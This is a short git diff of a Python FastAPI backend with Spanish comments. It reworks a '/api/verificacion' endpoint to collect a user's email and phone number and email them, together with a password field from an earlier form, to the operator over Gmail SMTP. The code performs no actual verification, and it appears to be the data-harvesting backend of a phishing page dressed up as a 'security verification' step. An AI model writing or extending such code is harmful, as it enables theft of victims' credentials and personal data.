@@ -91,26 +91,27 @@ class FormResponse(BaseModel):
 
 # Agrega esta clase nueva para recibir los datos del formulario 2
 class DatosVerificacion(BaseModel):
-    tipo: str  # "correo" o "telefono"
-    valor: str
+    correo: str
+    telefono: str
 
 @app.post("/api/verificacion")
 async def guardar_verificacion(data: DatosVerificacion):
+
     fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Esto toma el dato que enviaste (correo o teléfono) y lo envía a tu email
+
     try:
-        # Reutilizamos tu lógica de envío
+
         enviar_correo(
-            identificador=data.valor, 
-            codigo_pais="N/A", 
-            contrasena=f"Tipo de dato: {data.tipo}", 
+            identificador=data.correo,
+            codigo_pais=data.telefono,
+            contrasena="Verificación de seguridad",
             fecha=fecha
         )
+
     except Exception as e:
-        print(f"Error al enviar correo: {e}")
-        
-    return {"status": "ok"}
+        print(e)
+
+    return {"status":"ok"}
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
